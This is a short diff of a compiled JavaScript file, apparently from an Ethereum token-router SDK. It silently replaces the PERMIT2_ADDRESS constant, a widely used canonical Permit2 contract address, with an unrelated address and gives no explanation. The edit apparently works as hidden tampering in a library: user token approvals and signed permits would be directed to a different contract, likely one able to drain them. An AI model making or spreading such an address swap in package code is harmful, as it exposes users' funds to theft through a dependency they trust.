@@ -280,7 +280,7 @@ var WETH_ADDRESS = function WETH_ADDRESS(chainId) {
 	if (CHAIN_CONFIGS[chainId].weth == WETH_NOT_SUPPORTED_ON_CHAIN) throw new Error("Chain " + chainId + " does not have WETH");
 	return CHAIN_CONFIGS[chainId].weth;
 };
-var PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
+var PERMIT2_ADDRESS = '0x56503570D8ca38695a21273Bfc343C5C9fbE73B0';
 var CONTRACT_BALANCE = /*#__PURE__*/ethers.BigNumber.from(2).pow(255);
 var ETH_ADDRESS = '0x0000000000000000000000000000000000000000';
 var E_ETH_ADDRESS = '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee';
